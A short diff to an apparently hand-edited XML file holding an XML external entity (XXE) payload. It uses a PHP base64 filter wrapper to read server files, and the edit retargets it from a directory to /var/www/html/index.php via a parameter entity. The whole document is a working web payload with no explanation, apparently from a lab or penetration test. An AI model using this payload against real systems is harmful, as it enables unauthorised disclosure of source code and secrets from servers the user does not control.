@@ -1,5 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE data [
-    <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/">
+    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">
+    <!ENTITY data "%file;">
 ]>
-<data>&file;</data>
+<data>&data;</data>
